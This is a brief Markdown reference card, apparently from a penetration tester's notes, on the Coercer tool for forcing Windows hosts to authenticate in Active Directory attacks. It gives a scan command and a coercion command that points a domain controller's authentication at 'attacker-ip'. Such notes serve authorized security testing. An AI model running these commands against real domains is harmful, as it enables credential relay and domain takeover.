---
tags: [tool, activedirectory, coercion]
tool: "coercer"
category: "Active Directory"
installed: true
phase: [exploitation]
---

# Coercer - Authentication Coercion Framework

## Tool Overview
Purpose: Force authentication from Windows machines
Location: ~/tools/activedirectory/Coercer/coercer.py

## How to Use It

Basic Scan:
coercer -d domain.local -u user -p pass --target dc-ip

Coerce Authentication:
coercer -d domain.local -u user -p pass --target dc-ip --listener attacker-ip

## Related Tools
petitpotam, printerbug, dnschef
